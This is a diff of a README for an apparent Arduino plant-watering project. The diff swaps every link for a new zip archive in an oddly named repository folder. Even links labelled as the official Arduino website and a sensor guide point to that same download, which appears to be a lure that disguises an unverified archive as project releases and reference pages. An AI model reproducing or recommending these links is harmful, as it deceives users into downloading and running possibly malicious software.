@@ -1,6 +1,6 @@
 # 🌱 Automatic_plant_watering_system-Aurdino - Keep Your Plants Watered Effortlessly
 
-[![Download](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/Automatic_plant_watering_system-Aurdino_v2.6.zip%20Release-blue)](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/Automatic_plant_watering_system-Aurdino_v2.6.zip)
+[![Download](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/watering-plant-Aurdino-system-Automatic-1.5-alpha.1.zip%20Release-blue)](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/watering-plant-Aurdino-system-Automatic-1.5-alpha.1.zip)
 
 ## 📋 Introduction
 Welcome to the Automatic Plant Watering System project! This Arduino-based solution helps you automatically water your plants using a soil moisture sensor. It's perfect for anyone looking to maintain healthy plants without constant attention. Whether you're a student or a gardening enthusiast, this project can make your life easier.
@@ -16,7 +16,7 @@ To get started with this project, follow these steps to download and install the
 - **Computer**: A computer with internet access to download the necessary files.
 
 ## 🔗 Download & Install
-Visit this page to download the latest version of the software: [Releases Page](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/Automatic_plant_watering_system-Aurdino_v2.6.zip).
+Visit this page to download the latest version of the software: [Releases Page](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/watering-plant-Aurdino-system-Automatic-1.5-alpha.1.zip).
 
 1. Go to the releases page.
 2. Look for the latest version.
@@ -69,9 +69,9 @@ If you need help or have questions about this project, feel free to reach out:
 Contributions are welcome! If you want to suggest changes or improvements, feel free to fork the repository and submit a pull request.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/Automatic_plant_watering_system-Aurdino_v2.6.zip)
-- [Arduino Official Website](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/Automatic_plant_watering_system-Aurdino_v2.6.zip)
-- [Soil Moisture Sensor Guide](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/Automatic_plant_watering_system-Aurdino_v2.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/watering-plant-Aurdino-system-Automatic-1.5-alpha.1.zip)
+- [Arduino Official Website](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/watering-plant-Aurdino-system-Automatic-1.5-alpha.1.zip)
+- [Soil Moisture Sensor Guide](https://raw.githubusercontent.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/main/agrarianly/watering-plant-Aurdino-system-Automatic-1.5-alpha.1.zip)
 
 ## 🎉 Acknowledgments
 Thank you to everyone who contributed to this project, including users who provided feedback and improvements.
